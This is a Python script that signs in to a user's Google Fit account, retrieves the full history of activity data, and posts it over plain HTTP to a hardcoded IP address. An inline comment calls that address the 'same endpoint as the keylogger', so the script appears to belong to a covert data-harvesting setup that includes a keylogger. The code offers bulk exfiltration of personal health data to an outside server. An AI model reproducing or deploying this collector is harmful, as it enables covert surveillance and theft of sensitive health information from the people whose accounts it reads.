import os
import requests
from datetime import datetime, timezone
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build

# Define the Google Fit API scopes
SCOPES = ['https://www.googleapis.com/auth/fitness.activity.read']
ENDPOINT = "http://13.56.59.39/api/activity"  # Same endpoint as the keylogger

def authenticate_google_fit():
    """Authenticate the user with Google API."""
    creds = None
    # Check if token.json exists for saved credentials
    if os.path.exists('token.json'):
        creds = Credentials.from_authorized_user_file('token.json', SCOPES)

    # If no valid credentials, log in
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
            creds = flow.run_local_server(port=8080)

        # Save the credentials for the next run
        with open('token.json', 'w') as token:
            token.write(creds.to_json())

    return creds

def fetch_google_fit_data(service):
    """Fetch all available health activity data from Google Fit."""
    # Define a very large time range to pull all data
    start_date = datetime(2000, 1, 1, tzinfo=timezone.utc)  # Arbitrary early date
    end_date = datetime.now(timezone.utc)

    # Create dataset ID using nanoseconds
    dataset_id = f"{int(start_date.timestamp() * 1e9)}-{int(end_date.timestamp() * 1e9)}"

    # Get available data sources
    data_sources = service.users().dataSources().list(userId='me').execute()

    activity_data = []
    for source in data_sources.get('dataSource', []):
        print(f"Retrieving data from Data Source: {source['dataStreamId']} ({source.get('dataStreamName', 'Unnamed Source')})")
        if 'derived:com.google.activity.segment' in source['dataStreamId']:
            dataset = service.users().dataSources().datasets().get(
                userId='me',
                dataSourceId=source['dataStreamId'],
                datasetId=dataset_id
            ).execute()
            for point in dataset.get('point', []):
                start_time = datetime.fromtimestamp(int(point['startTimeNanos']) / 1e9, tz=timezone.utc)
                end_time = datetime.fromtimestamp(int(point['endTimeNanos']) / 1e9, tz=timezone.utc)
                activity = point['value'][0]['intVal']  # Activity type
                activity_data.append({
                    'start_time': start_time.isoformat(),
                    'end_time': end_time.isoformat(),
                    'activity': activity,
                    'source': 'google_fit'  # Add source identifier
                })
    return activity_data

def send_to_endpoint(data):
    """Send the collected data to the shared endpoint."""
    try:
        response = requests.post(ENDPOINT, json=data)
        response.raise_for_status()
        print(f"Data successfully sent to {ENDPOINT}: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send data to {ENDPOINT}: {e}")

def main():
    # Authenticate and build the service
    creds = authenticate_google_fit()
    service = build('fitness', 'v1', credentials=creds)

    # Fetch the health activity data
    data = fetch_google_fit_data(service)

    if data:
        # Send data to the shared endpoint
        send_to_endpoint(data)

if __name__ == '__main__':
    main()
